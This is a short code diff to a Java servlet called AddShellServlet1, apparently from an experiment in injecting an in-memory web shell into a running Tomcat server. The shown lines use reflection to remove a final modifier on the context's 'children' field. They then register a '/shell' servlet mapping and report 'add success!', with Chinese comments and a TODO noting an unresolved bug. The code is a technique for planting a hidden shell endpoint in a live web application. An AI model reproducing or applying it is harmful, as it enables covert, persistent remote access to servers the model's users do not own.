@@ -64,7 +64,8 @@ public class AddShellServlet1 extends HttpServlet {
             Field modifiers = childrenField.getClass().getDeclaredField("modifiers");
             modifiers.setAccessible(true);
             modifiers.setInt(childrenField,childrenField.getModifiers() & ~Modifier.FINAL);
-            //设置值
+
+            //还原children,可以不做，用的是一个引用
             childrenField.set(standardContext,children);
 
 
@@ -72,6 +73,7 @@ public class AddShellServlet1 extends HttpServlet {
             //TODO 有bug，后面研究
             standardContext.addServletMappingDecoded("/shell","shell");
             resp.getWriter().write("add success!");
+            return;
 
         } catch (Exception e) {
             e.printStackTrace();
